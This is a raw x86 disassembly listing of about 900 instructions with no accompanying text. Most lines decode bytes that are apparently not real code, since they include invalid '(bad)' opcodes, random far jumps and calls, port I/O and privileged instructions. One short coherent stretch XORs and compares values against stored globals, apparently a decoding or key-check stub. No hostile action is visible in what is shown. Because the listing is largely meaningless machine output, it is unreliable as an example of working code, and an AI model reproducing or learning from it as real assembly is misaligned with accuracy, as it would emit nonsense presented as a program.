  40fa9e:	scas   al,BYTE PTR es:[edi]
  40fa9f:	stc    
  40faa0:	xchg   ebp,eax
  40faa1:	loop   0x40fa65
  40faa3:	sub    DWORD PTR [edi],esp
  40faa5:	imul   eax,edi,0x96aa6236
  40faab:	mov    bh,0x27
  40faad:	aas    
  40faae:	jae    0x40fa76
  40fab0:	lahf   
  40fab1:	test   dh,dl
  40fab3:	pusha  
  40fab4:	push   cs
  40fab5:	cmp    eax,0xec4c6a6e
  40faba:	xchg   ebp,eax
  40fabb:	adc    bl,BYTE PTR [esi+0x41337163]
  40fac1:	jle    0x40fa4f
  40fac3:	ins    BYTE PTR es:[edi],dx
  40fac4:	mov    esi,0xb430b6d9
  40fac9:	arpl   WORD PTR [ecx],sp
  40facb:	sub    al,0x5b
  40facd:	mov    ds:0x6847799c,eax
  40fad2:	outs   dx,DWORD PTR ds:[esi]
  40fad3:	mov    dl,0xbe
  40fad5:	call   0xa143:0x9aef99d7
  40fadc:	mov    ebp,0x4d4ff1c1
  40fae1:	inc    ecx
  40fae2:	lea    ebp,[ecx]
  40fae4:	or     ah,al
  40fae6:	and    edx,ebp
  40fae8:	or     DWORD PTR [ebx+0x592bb7e7],ecx
  40faee:	mov    bl,0x64
  40faf0:	outs   dx,BYTE PTR ds:[esi]
  40faf1:	xchg   esi,eax
  40faf2:	fs dec ebp
  40faf4:	jecxz  0x40fb32
  40faf6:	pushf  
  40faf7:	enter  0x17b0,0xd9
  40fafb:	ins    DWORD PTR es:[edi],dx
  40fafc:	xchg   ebp,eax
  40fafd:	sti    
  40fafe:	pop    edi
  40faff:	add    al,0x14
  40fb01:	mov    ebx,0xc796e406
  40fb06:	jg     0x40fad1
  40fb08:	(bad)  
  40fb09:	xchg   edx,eax
  40fb0a:	push   edx
  40fb0b:	lods   al,BYTE PTR ds:[esi]
  40fb0c:	sbb    BYTE PTR [eax+0x19938311],0xa7
  40fb13:	repnz pusha 
  40fb15:	push   ss
  40fb16:	jecxz  0x40facb
  40fb18:	jmp    0xff7:0x9e4cb4e3
  40fb1f:	icebp  
  40fb20:	or     al,0x72
  40fb22:	push   cs
  40fb23:	(bad)  
  40fb24:	dec    ebp
  40fb25:	sti    
  40fb26:	push   eax
  40fb27:	mov    ?,WORD PTR [edi]
  40fb29:	stc    
  40fb2a:	xor    DWORD PTR [edx+0x43f9ac1f],0x14e38923
  40fb34:	xchg   edi,eax
  40fb35:	scas   eax,DWORD PTR es:[edi]
  40fb36:	mov    dl,0x6e
  40fb38:	xchg   edx,eax
  40fb39:	iret   
  40fb3a:	cwde   
  40fb3b:	jmp    0x90d6005
  40fb40:	je     0x40fb32
  40fb42:	retf   
  40fb43:	sbb    al,0xcb
  40fb45:	push   ds
  40fb46:	rcl    DWORD PTR [bx],cl
  40fb49:	(bad)  
  40fb4b:	bound  ecx,QWORD PTR [eax+0x2638e734]
  40fb51:	fnstcw WORD PTR [edi+0x1b]
  40fb54:	les    edx,FWORD PTR [ebx-0x72]
  40fb57:	xor    eax,0x1c7e2c25
  40fb5c:	sub    ah,BYTE PTR [eax]
  40fb5e:	or     al,0x3a
  40fb60:	jp     0x40fbdc
  40fb62:	clc    
  40fb63:	mov    ds:0x37be06b1,al
  40fb68:	daa    
  40fb69:	sbb    al,0x24
  40fb6b:	pop    ebp
  40fb6c:	mov    esi,0x6e605f96
  40fb71:	lods   al,BYTE PTR ds:[esi]
  40fb72:	pop    esi
  40fb73:	add    eax,0x368e9085
  40fb78:	jmp    0xf8a2:0xf5d3ae1c
  40fb7f:	jne    0x40fb13
  40fb81:	sbb    DWORD PTR [esi+edx*2-0x3a],ebp
  40fb85:	adc    eax,0x2340d8b1
  40fb8a:	pop    ecx
  40fb8b:	mov    bh,0xc5
  40fb8d:	data16 int3 
  40fb8f:	push   0x6f
  40fb91:	inc    edx
  40fb92:	xchg   ebp,eax
  40fb93:	cmp    dl,BYTE PTR [ebx+0x6dc8e490]
  40fb99:	xchg   DWORD PTR [edx-0x1a],esp
  40fb9c:	xchg   ecx,eax
  40fb9d:	xor    BYTE PTR [eax-0x6289d293],0x5a
  40fba4:	test   al,0x5d
  40fba6:	sub    al,0x15
  40fba8:	mov    al,ds:0xff116353
  40fbad:	test   eax,0x4bc6e6ed
  40fbb2:	push   eax
  40fbb3:	repz je 0x40fbe0
  40fbb6:	div    ah
  40fbb8:	(bad)  
  40fbb9:	out    dx,al
  40fbba:	dec    ebp
  40fbbb:	lea    ebx,[eax+0x7b]
  40fbbe:	int    0x33
  40fbc0:	inc    esi
  40fbc1:	mov    cs,esp
  40fbc3:	or     BYTE PTR [esi+0x28e74f29],cl
  40fbc9:	fnstenv [eax-0x6ce7f4ab]
  40fbcf:	jno    0x40fbb8
  40fbd1:	and    eax,0x6d03dfd9
  40fbd6:	out    dx,eax
  40fbd7:	xchg   ebp,eax
  40fbd8:	mul    BYTE PTR ds:[esi+0x73b96c6c]
  40fbdf:	shl    BYTE PTR [ecx],cl
  40fbe1:	out    0xd9,al
  40fbe3:	and    al,0xaf
  40fbe5:	in     eax,dx
  40fbe6:	(bad)  
  40fbe7:	mov    ch,0xf6
  40fbe9:	and    ebx,DWORD PTR [eax+edi*8-0x73]
  40fbed:	mov    ebx,es
  40fbef:	cmp    DWORD PTR [edx+esi*4],0x27ad8e96
  40fbf6:	cmp    eax,0x78e9205c
  40fbfb:	mov    al,0xa1
  40fbfd:	and    BYTE PTR [ebp+eax*2+0x7e],al
  40fc01:	mov    bh,0x27
  40fc03:	pop    edx
  40fc04:	cdq    
  40fc05:	inc    esp
  40fc06:	xor    ax,0x8693
  40fc0a:	inc    edx
  40fc0b:	xlat   BYTE PTR ds:[ebx]
  40fc0c:	add    ecx,edx
  40fc0e:	inc    eax
  40fc0f:	addr16 mov al,0x55
  40fc12:	push   0x36
  40fc14:	or     al,0xf2
  40fc16:	fcmovbe st,st(4)
  40fc18:	std    
  40fc19:	add    bh,BYTE PTR [ecx]
  40fc1b:	xchg   edx,eax
  40fc1c:	add    eax,0x17f00ec5
  40fc21:	(bad)  
  40fc23:	arpl   WORD PTR [edx+0x46],ax
  40fc26:	dec    esp
  40fc27:	pop    ebp
  40fc28:	mov    dl,0xe8
  40fc2a:	mov    ebx,0x32092d97
  40fc2f:	jp     0x40fc76
  40fc31:	shl    DWORD PTR [ebp+eiz*1+0x1b],cl
  40fc35:	mov    esp,0x64384c4f
  40fc3a:	xor    DWORD PTR [edi+edi*8-0x31131b2],edx
  40fc41:	mov    ds:0xe3987e0,al
  40fc46:	xchg   al,bl
  40fc48:	imul   ebp,ebp,0x34
  40fc4b:	ss push ss
  40fc4d:	mov    bl,0x97
  40fc4f:	sti    
  40fc50:	retf   0x55cf
  40fc53:	jge    0x40fcbf
  40fc55:	(bad)  
  40fc56:	nop
  40fc57:	xlat   BYTE PTR ds:[ebx]
  40fc58:	inc    ecx
  40fc59:	mov    ch,0x7c
  40fc5b:	jnp    0x40fc02
  40fc5d:	jnp    0x40fc0d
  40fc5f:	sbb    eax,0xf3a21d2e
  40fc64:	rcr    bh,1
  40fc66:	adc    DWORD PTR [ecx+0x47],esp
  40fc69:	in     eax,dx
  40fc6a:	or     eax,0x5e095362
  40fc6f:	adc    bh,BYTE PTR [eax+0xcd47ab6]
  40fc75:	pop    es
  40fc76:	out    dx,eax
  40fc77:	scas   al,BYTE PTR es:[edi]
  40fc78:	xor    esi,edx
  40fc7a:	fs mov esi,0x6dc9831c
  40fc80:	cmp    eax,0x15171b0d
  40fc85:	popa   
  40fc86:	ins    BYTE PTR es:[edi],dx
  40fc87:	mov    cs,WORD PTR [edi+0x61]
  40fc8a:	mov    eax,ds:0x5019d0f0
  40fc8f:	ins    BYTE PTR es:[edi],dx
  40fc90:	out    0x6a,al
  40fc92:	jecxz  0x40fca2
  40fc94:	clc    
  40fc95:	sbb    al,0xe8
  40fc97:	outs   dx,DWORD PTR ds:[esi]
  40fc98:	shl    al,1
  40fc9a:	dec    edx
  40fc9b:	push   es
  40fc9c:	lds    esp,FWORD PTR [edi-0x3fa65033]
  40fca2:	jecxz  0x40fca1
  40fca4:	cdq    
  40fca5:	inc    esp
  40fca6:	and    al,BYTE PTR [esi]
  40fca8:	sahf   
  40fca9:	(bad)  
  40fcaa:	mov    dh,0xa7
  40fcac:	retf   0x89de
  40fcaf:	fisttp DWORD PTR [ebx+0x76bca128]
  40fcb6:	cmc    
  40fcb7:	clc    
  40fcb8:	int3   
  40fcb9:	add    al,0xfa
  40fcbb:	lods   al,BYTE PTR ds:[esi]
  40fcbc:	fidivr DWORD PTR [edx-0xaf5a7d2]
  40fcc2:	dec    ebp
  40fcc3:	add    eax,DWORD PTR [esi]
  40fcc5:	xor    bl,BYTE PTR [esi+0x37]
  40fcc8:	and    BYTE PTR [edx+0x5e],dl
  40fccb:	int3   
  40fccc:	std    
  40fccd:	xor    DWORD PTR [esi],eax
  40fccf:	out    0xe1,eax
  40fcd1:	jbe    0x40fd24
  40fcd3:	jns    0x40fc64
  40fcd5:	or     DWORD PTR [ebp-0x20],edi
  40fcd8:	fdivr  DWORD PTR [ebx+0x536b2f9c]
  40fcde:	xor    cl,bh
  40fce0:	sub    al,0x46
  40fce2:	bound  ecx,QWORD PTR [ecx+0x49]
  40fce5:	jp     0x40fcce
  40fce7:	xchg   ebp,ebp
  40fce9:	xchg   bl,bh
  40fceb:	int    0xd6
  40fced:	mov    bl,ah
  40fcef:	and    edi,ecx
  40fcf1:	or     ah,BYTE PTR [edx-0x6fc2ebf8]
  40fcf7:	pop    eax
  40fcf8:	sbb    al,0x1d
  40fcfa:	push   0xffffffb0
  40fcfc:	pop    ebx
  40fcfd:	jmp    0x40fcae
  40fcff:	pop    ecx
  40fd00:	dec    ebp
  40fd01:	div    DWORD PTR [ecx+0x5c6e703]
  40fd07:	popf   
  40fd08:	mov    ebx,0x31388eb9
  40fd0d:	ja     0x40fd3a
  40fd0f:	fstp   DWORD PTR [edi]
  40fd11:	sbb    DWORD PTR [esi+0x20],ebp
  40fd14:	dec    edx
  40fd15:	adc    DWORD PTR [edx-0x42],0xffffffe0
  40fd19:	mov    ebp,0xb574a36e
  40fd1e:	popa   
  40fd1f:	(bad)  
  40fd20:	push   esp
  40fd21:	add    al,0x64
  40fd23:	adc    al,0x3e
  40fd25:	jecxz  0x40fcae
  40fd27:	push   ebp
  40fd28:	fidiv  DWORD PTR [ebx+0x65ff719a]
  40fd2e:	inc    eax
  40fd2f:	sub    dh,bl
  40fd31:	rcr    BYTE PTR [edx+0x2a],0x4c
  40fd35:	xchg   ebx,eax
  40fd36:	inc    eax
  40fd37:	(bad)  [esi]
  40fd39:	mov    edi,0xc4ae8f9
  40fd3e:	add    BYTE PTR [eax],al
  40fd40:	mov    ecx,DWORD PTR ds:0x414afe
  40fd46:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40fd4c:	mov    DWORD PTR [ecx],eax
  40fd4e:	mov    eax,DWORD PTR [ebp-0x8]
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	pop    ds
  40fd9d:	dec    esp
  40fd9e:	inc    edx
  40fd9f:	call   0x79f4:0x7e7eb882
  40fda6:	jle    0x40fe26
  40fda8:	xchg   ecx,eax
  40fda9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdaa:	or     al,0x47
  40fdac:	inc    edx
  40fdad:	out    0x40,al
  40fdaf:	jbe    0x40fd51
  40fdb1:	int3   
  40fdb2:	ins    BYTE PTR es:[edi],dx
  40fdb3:	inc    ecx
  40fdb4:	bound  ebx,QWORD PTR [eax+0x10ccaab5]
  40fdba:	dec    ebp
  40fdbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdbc:	inc    eax
  40fdbd:	leave  
  40fdbe:	mov    esi,0x592d25cb
  40fdc3:	pop    ds
  40fdc4:	dec    ebx
  40fdc5:	dec    ecx
  40fdc6:	(bad)  
  40fdc7:	push   edx
  40fdc8:	and    esi,DWORD PTR [esi+0x54c8de95]
  40fdce:	lods   eax,DWORD PTR ds:[esi]
  40fdcf:	scas   al,BYTE PTR es:[edi]
  40fdd0:	into   
  40fdd1:	push   0xd5863bd8
  40fdd6:	xor    eax,DWORD PTR [ebx-0x67]
  40fdd9:	addr16 add edx,ecx
  40fddc:	fmul   st,st(6)
  40fdde:	mov    al,0x16
  40fde0:	push   esp
  40fde1:	push   edx
  40fde2:	iret   
  40fde3:	fistp  QWORD PTR [ebx-0x33]
  40fde6:	push   di
  40fde8:	push   ebx
  40fde9:	jbe    0x40fe4c
  40fdeb:	sub    al,BYTE PTR [edx+ecx*8]
  40fdee:	imul   esp,DWORD PTR [esi-0x4fdd4e45],0x7e583000
  40fdf8:	xchg   edx,eax
  40fdf9:	xchg   ecx,eax
  40fdfa:	(bad)  
  40fdfc:	xlat   BYTE PTR ds:[ebx]
  40fdfd:	fnstsw WORD PTR [edi+0x1f]
  40fe00:	xchg   edi,eax
  40fe01:	clc    
  40fe02:	jns    0x40fdaf
  40fe04:	xchg   BYTE PTR [ebx],dl
  40fe06:	sbb    eax,DWORD PTR [edi-0x281bd03]
  40fe0c:	fwait
  40fe0d:	stos   BYTE PTR es:[edi],al
  40fe0e:	test   eax,0xc4e28e69
  40fe13:	pop    esp
  40fe14:	xchg   ebp,eax
  40fe15:	lods   al,BYTE PTR ds:[esi]
  40fe16:	add    DWORD PTR [ecx+0x5b],esi
  40fe19:	push   0x544ab29f
  40fe1e:	mov    ds:0xc0f1b737,al
  40fe23:	outs   dx,BYTE PTR ds:[esi]
  40fe24:	pop    eax
  40fe25:	test   DWORD PTR [ebp+0x18],0xb1df0f2c
  40fe2c:	loope  0x40fe94
  40fe2e:	inc    esi
  40fe2f:	xor    bh,BYTE PTR [edx]
  40fe31:	mov    edi,0x8d3241ea
  40fe36:	mov    al,0x5b
  40fe38:	jno    0x40fdcb
  40fe3a:	gs stos DWORD PTR es:[edi],eax
  40fe3c:	repnz mov dl,0xe0
  40fe3f:	inc    eax
  40fe40:	sub    DWORD PTR [ecx+0x4d],eax
  40fe43:	mov    al,ds:0x3009f540
  40fe48:	iret   
  40fe49:	sub    al,0xb2
  40fe4b:	lahf   
  40fe4c:	clc    
  40fe4d:	test   DWORD PTR [esi],edx
  40fe4f:	jecxz  0x40fe1b
  40fe51:	or     ah,cl
  40fe53:	inc    edx
  40fe54:	mov    eax,ds:0x34e4fbf2
  40fe59:	xor    edx,DWORD PTR [ebx+0x33]
  40fe5c:	xchg   edx,eax
  40fe5d:	scas   al,BYTE PTR es:[edi]
  40fe5e:	out    dx,al
  40fe5f:	push   edi
  40fe60:	aaa    
  40fe61:	cld    
  40fe62:	push   esi
  40fe63:	adc    edx,DWORD PTR [edi+ecx*4+0x51a29ddd]
  40fe6a:	lods   eax,DWORD PTR ds:[esi]
  40fe6b:	pop    ebp
  40fe6c:	data16 stos BYTE PTR es:[edi],al
  40fe6e:	jmp    0xd6a3908f
  40fe73:	jbe    0x40fe08
  40fe75:	adc    esp,DWORD PTR [edi-0x6b07a8ff]
  40fe7b:	fisttp QWORD PTR [ecx]
  40fe7d:	xlat   BYTE PTR ds:[ebx]
  40fe7e:	loopne 0x40fe57
  40fe80:	jp     0x40fef2
  40fe82:	(bad)  
  40fe83:	jno    0x40feb5
  40fe85:	and    al,0x4f
  40fe87:	push   0xc7479267
  40fe8c:	jp     0x40fe85
  40fe8e:	or     DWORD PTR [ebx],edx
  40fe90:	inc    ebx
  40fe91:	popa   
  40fe92:	mov    bh,0x10
  40fe94:	ficom  DWORD PTR [edi-0x33e97113]
  40fe9a:	(bad)  
  40fe9b:	lock int3 
  40fe9d:	add    esp,ebx
  40fe9f:	ins    DWORD PTR es:[edi],dx
  40fea0:	int3   
  40fea1:	ds mov edi,0x8a7be20a
  40fea7:	add    DWORD PTR [edx+0x75],ecx
  40feaa:	xchg   ecx,esi
  40feac:	lods   eax,DWORD PTR ds:[esi]
  40fead:	add    BYTE PTR [edx],ch
  40feaf:	es cs scas eax,DWORD PTR es:[edi]
  40feb2:	jbe    0x40fefd
  40feb4:	int3   
  40feb5:	shl    DWORD PTR [esi+0x54],1
  40feb8:	inc    ebp
  40feb9:	push   0xfffffff7
  40febb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40febc:	outs   dx,DWORD PTR ds:[esi]
  40febd:	aam    0x4e
  40febf:	cmp    ebp,DWORD PTR [ebp-0x5493c069]
  40fec5:	aad    0x65
  40fec7:	cmp    al,0x32
  40fec9:	inc    esi
  40feca:	mov    dh,0xbd
  40fecc:	sub    ch,0xfe
  40fecf:	mov    edx,0x31e1c0a
  40fed4:	add    esp,DWORD PTR [ecx+0x39cee3e6]
  40feda:	(bad)  
  40fedb:	retf   0x38e7
  40fede:	ror    BYTE PTR [esi+0x6c],1
  40fee1:	ins    DWORD PTR es:[edi],dx
  40fee2:	icebp  
  40fee3:	xchg   ecx,eax
  40fee4:	adc    eax,0x5b07f4e7
  40fee9:	aas    
  40feea:	stos   BYTE PTR es:[edi],al
  40feeb:	xchg   esp,eax
  40feec:	xchg   esi,eax
  40feed:	mov    dl,0x5a
  40feef:	jbe    0x40ff38
  40fef1:	xlat   BYTE PTR ds:[ebx]
  40fef2:	jmp    0x566b3fc5
  40fef7:	fisubr DWORD PTR [ebx+0xb599525]
  40fefd:	cmp    ebp,esp
  40feff:	enter  0xc062,0xd5
  40ff03:	(bad)  
  40ff04:	jmp    0x2fb1aa4d
  40ff09:	mov    esp,0xa4a8245f
  40ff0e:	mov    ebx,0x12bf2451
  40ff13:	bound  esp,QWORD PTR [edi]
  40ff15:	or     al,BYTE PTR [eax-0x248bc160]
  40ff1b:	pop    ebx
  40ff1c:	nop
  40ff1d:	adc    edi,DWORD PTR [ecx+esi*1+0x6fbf92a6]
  40ff24:	ins    BYTE PTR es:[edi],dx
  40ff25:	ret    
  40ff26:	jb     0x40ff07
  40ff28:	jmp    0x251df143
  40ff2d:	adc    eax,0xa80d6948
  40ff32:	shl    BYTE PTR [edx-0x37b53f28],0xa
  40ff39:	out    dx,eax
  40ff3a:	xor    cl,BYTE PTR [edi+edi*2+0x61cfdcd1]
  40ff41:	xchg   ebp,eax
  40ff42:	and    esi,DWORD PTR [eax+0x53]
  40ff45:	imul   edi,DWORD PTR [esi-0x2b490b9e],0xffffffe5
  40ff4c:	fadd   DWORD PTR [ebp+eiz*2+0x18]
  40ff50:	aad    0xd2
  40ff52:	ja     0x40ff70
  40ff54:	push   0x6b
  40ff56:	pop    ebp
  40ff57:	aad    0xbc
  40ff59:	or     ah,BYTE PTR [esi-0x80]
  40ff5c:	push   0xffffffb7
  40ff5e:	add    eax,0x58594390
  40ff63:	adc    DWORD PTR [ebx*2+0xe517047],0x6d
  40ff6b:	jb     0x40ff28
  40ff6d:	in     al,dx
  40ff6e:	push   0x1af4c5a4
  40ff73:	test   eax,0x6e66811e
  40ff78:	lea    esi,[ecx-0x53a9d8db]
  40ff7e:	sbb    al,0xab
  40ff80:	xchg   esi,eax
  40ff81:	(bad)  [edi-0x1f65bd34]
  40ff87:	cmp    BYTE PTR [edi+0x31d1c162],0x27
  40ff8e:	shl    DWORD PTR [edx],1
  40ff90:	test   eax,0x14fff795
  40ff95:	clc    
  40ff96:	push   ds
  40ff97:	push   esp
  40ff98:	ror    dl,1
  40ff9a:	call   0x685a28d0
  40ff9f:	sbb    BYTE PTR [eax],al
  40ffa1:	inc    edi
  40ffa2:	mov    esp,esi
  40ffa4:	xchg   ecx,eax
  40ffa5:	push   ds
  40ffa6:	fnsave [edi-0x559290d1]
  40ffac:	icebp  
  40ffad:	in     al,dx
  40ffae:	adc    DWORD PTR [eax+0x34],ebx
  40ffb1:	mov    ecx,0xf572e48c
  40ffb6:	ss out 0x5d,eax
  40ffb9:	scas   al,BYTE PTR es:[edi]
  40ffba:	sbb    eax,0x69befc48
  40ffbf:	push   eax
  40ffc0:	mov    esp,0xe9c6273f
  40ffc5:	xchg   esp,eax
  40ffc6:	add    BYTE PTR [edi+0x53aaeee1],dl
  40ffcc:	push   ss
  40ffcd:	sub    eax,0x3ffeb483
  40ffd2:	repz mov ds:0xa7b0cfaf,al
  40ffd8:	xchg   ecx,eax
  40ffd9:	leave  
  40ffda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffdb:	dec    esp
  40ffdc:	or     ah,BYTE PTR [ebx]
  40ffde:	in     al,dx
  40ffdf:	fcomi  st,st(2)
  40ffe1:	xlat   BYTE PTR ds:[ebx]
  40ffe2:	ja     0x40ff83
  40ffe4:	mov    al,ds:0xb6422cd6
  40ffe9:	clc    
  40ffea:	push   eax
  40ffeb:	dec    edx
  40ffec:	adc    al,0x8c
  40ffee:	scas   eax,DWORD PTR es:[edi]
  40ffef:	popf   
  40fff0:	or     eax,0xdfd2b341
  40fff5:	sbb    al,0xc6
  40fff7:	push   esp
  40fff8:	xlat   BYTE PTR ds:[ebx]
  40fff9:	bound  ebp,QWORD PTR [edi+0x6e11fea]
  40ffff:	cdq    
  410000:	pop    es
  410001:	in     eax,dx
  410002:	je     0x40ff94
  410004:	or     DWORD PTR [eax+0x2],eax
  410007:	mov    dh,0xf2
  410009:	lahf   
  41000a:	inc    ebp
  41000b:	cmp    BYTE PTR [ebx],ch
  41000d:	xor    ecx,DWORD PTR [edx]
  41000f:	sbb    DWORD PTR [edi+eiz*4+0x77],0xe8102503
  410017:	lods   al,BYTE PTR ds:[esi]
  410018:	inc    ebx
  410019:	mov    ch,0x2a
  41001b:	popa   
  41001c:	sbb    eax,eax
  41001e:	jg     0x41000e
  410020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410021:	aas    
  410022:	rol    BYTE PTR [eax-0x42],0x54
  410026:	or     bl,dl
  410028:	ret    0x464e
  41002b:	cdq    
  41002c:	out    dx,eax
  41002d:	fistp  DWORD PTR ds:0x4fcaf7b
  410033:	mov    esi,0x289bd6f8
  410038:	jmp    0x866a7788
  41003d:	cdq    
  41003e:	fld    QWORD PTR [ebx+0x35]
  410041:	xor    cl,ch
  410043:	out    0x34,eax
  410045:	bound  esp,QWORD PTR [ecx+0x56]
  410048:	xor    al,0x34
  41004a:	inc    ebp
  41004b:	sbb    BYTE PTR [ebp+0x64],0xca
  41004f:	(bad)  
  410050:	mov    al,0xa5
  410052:	not    DWORD PTR [edi]
  410054:	adc    ecx,DWORD PTR [ebx+0x3]
  410057:	in     eax,dx
  410058:	retf   
  410059:	(bad)  
  41005b:	int    0xd5
  41005d:	stc    
  41005e:	lds    ecx,FWORD PTR [ecx+0x2a]
  410061:	dec    edx
  410062:	popa   
  410063:	inc    esi
  410064:	lods   al,BYTE PTR cs:[esi]
  410066:	xchg   BYTE PTR [edx+0x7a26e98f],bh
  41006c:	push   ss
  41006d:	push   cs
  41006e:	mov    cl,0x38
  410070:	push   edi
  410071:	out    dx,al
  410072:	js     0x4100c6
  410074:	stc    
  410075:	test   bh,bh
  410077:	stos   DWORD PTR es:[edi],eax
  410078:	push   cs
  410079:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41007b:	dec    esi
  41007c:	or     BYTE PTR [edx+0x29],bh
  41007f:	and    dl,BYTE PTR [edx+eiz*1+0x1843daf1]
  410086:	mov    edi,0xafb256dd
  41008b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41008c:	(bad)  [edi+0x4a8fbca7]
  410092:	enter  0xab3d,0x63
  410096:	test   eax,0xf8b725ed
  41009b:	xor    al,0xd9
  41009d:	adc    eax,0xb6f3aca6
  4100a2:	and    esi,esp
  4100a4:	fstp   TBYTE PTR [edi+0x2848bc9f]
  4100aa:	cmp    edi,DWORD PTR [eax-0x2fd7826]
  4100b0:	inc    edi
  4100b1:	sub    al,0x7
  4100b3:	xor    DWORD PTR [ecx+0x55],edi
  4100b6:	dec    edx
  4100b7:	inc    ebx
  4100b8:	mov    ebx,0x7a906849
  4100bd:	out    0x56,eax
  4100bf:	mov    bl,0xc3
  4100c1:	out    0x40,al
  4100c3:	retf   0xd3f1
  4100c6:	mov    WORD PTR [edi],ss
  4100c8:	mov    al,0x60
  4100ca:	xchg   esi,eax
  4100cb:	loop   0x4100ea
  4100cd:	shl    cl,0x61
  4100d0:	iret   
  4100d1:	je     0x41011f
  4100d3:	lock add esi,esp
  4100d6:	dec    ecx
  4100d7:	ror    BYTE PTR [esi-0x16eb6da6],cl
  4100dd:	and    esi,DWORD PTR [ebx+0x5cd1b03d]
  4100e3:	mov    ah,0xc0
  4100e5:	xor    ecx,esp
  4100e7:	leave  
  4100e8:	nop
  4100e9:	int3   
  4100ea:	xchg   ebp,eax
  4100eb:	adc    DWORD PTR [esi+eax*4],esp
  4100ee:	inc    ebx
  4100ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100f0:	lods   al,BYTE PTR ds:[esi]
  4100f1:	out    0xcb,al
  4100f3:	or     bl,BYTE PTR [ecx+ecx*1+0x36c12ffc]
  4100fa:	imul   edx,DWORD PTR [eax+0x4a94ef39],0xffffffe8
  410101:	call   0xc2280ca8
  410106:	lods   al,BYTE PTR ds:[esi]
  410107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410108:	lahf   
  410109:	mov    ebp,0x9d8263f0
  41010e:	mov    BYTE PTR [ebx],al
  410110:	fst    DWORD PTR [eax+ebx*8+0x6b]
  410114:	fidivr WORD PTR [esp+ecx*8-0x5]
  410118:	xchg   edi,eax
  410119:	shr    DWORD PTR ds:0x8b7dc421,cl
  41011f:	inc    ebp
  410120:	cld    
  410121:	xor    eax,edi
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    DWORD PTR [ebp+0x78eebce7],ecx
  41013a:	inc    esp
  41013b:	jle    0x4101bb
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x410162
  410142:	or     al,0x9b
  410144:	mov    bh,dh
  410146:	fnsave ds:0x8fc4bfb7
  41014c:	push   0xffffff93
  41014e:	xchg   esp,eax
  41014f:	mov    ch,0x40
  410151:	pop    ecx
  410152:	scas   al,BYTE PTR es:[edi]
  410153:	jno    0x4100d9
  410155:	test   BYTE PTR [edx+0x68242b4f],0xd1
  41015c:	fst    DWORD PTR [ebp-0x54]
  41015f:	push   0x3f
  410161:	jg     0x41011d
  410163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410164:	sub    eax,0xf5ae6919
  410169:	lds    esp,FWORD PTR [edx+0x1]
  41016c:	dec    ebx
  41016d:	pop    ecx
  41016e:	sbb    eax,0xfcf78e16
  410173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410174:	int3   
  410175:	mov    esp,0x8c6f1222
  41017a:	dec    esi
  41017b:	lock scas eax,DWORD PTR es:[edi]
  41017d:	(bad)  
  41017e:	nop
  41017f:	sub    edi,ecx
  410181:	push   eax
  410182:	cmp    eax,DWORD PTR [edx-0x75]
  410185:	sbb    al,0xbc
  410187:	and    eax,eax
  410189:	les    esp,FWORD PTR [esi+0x78]
  41018c:	fwait
  41018d:	je     0x410205
  41018f:	adc    DWORD PTR [edi-0x1c8db2b1],eax
  410195:	jns    0x410140
  410197:	mov    ebp,0xbfe3e9eb
  41019c:	nop
  41019d:	fucomip st,st(5)
  41019f:	pop    esp
  4101a0:	retf   
  4101a1:	sub    DWORD PTR ds:0xf882be6b,edi
  4101a7:	int    0xfe
  4101a9:	in     eax,dx
  4101aa:	aas    
  4101ab:	test   al,0xf9
  4101ad:	ds loop 0x410211
  4101b0:	out    0xd4,al
  4101b2:	push   esp
  4101b3:	cli    
  4101b4:	mov    esp,0xb5aa6ff3
  4101b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ba:	mov    eax,0x2336f171
  4101bf:	and    BYTE PTR [eax-0x413cb49a],0xc1
  4101c6:	mov    cl,0x8d
  4101c8:	add    al,BYTE PTR [esi-0x54b260a5]
  4101ce:	sbb    dl,BYTE PTR [edx]
  4101d0:	inc    ebp
  4101d1:	and    al,0x6b
  4101d3:	or     ebx,DWORD PTR [ebx+0x70089be7]
  4101d9:	pop    ss
  4101da:	or     cl,bh
  4101dc:	sbb    eax,0xf92443b2
  4101e1:	int    0x36
  4101e3:	(bad)  
  4101e4:	into   
  4101e5:	xor    dh,BYTE PTR [esi-0x23]
  4101e8:	ins    DWORD PTR es:[edi],dx
  4101e9:	pusha  
  4101ea:	aad    0x10
  4101ec:	stc    
  4101ed:	add    al,0xc4
  4101ef:	test   eax,0xe17f98bf
  4101f4:	ror    BYTE PTR [edx],0x3f
  4101f7:	or     al,BYTE PTR [ecx-0x3b]
  4101fa:	adc    BYTE PTR [ebx-0x10337d4d],cl
